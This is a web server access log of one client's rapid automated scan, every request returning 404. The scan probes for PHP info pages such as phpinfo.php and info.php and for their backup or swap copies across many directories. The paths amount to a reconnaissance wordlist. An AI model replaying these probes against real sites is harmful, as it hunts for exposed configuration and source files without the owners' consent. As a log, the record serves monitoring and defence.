043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:39;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:40;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:41;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:42;;/phpinfo.php.tmp;GET;404
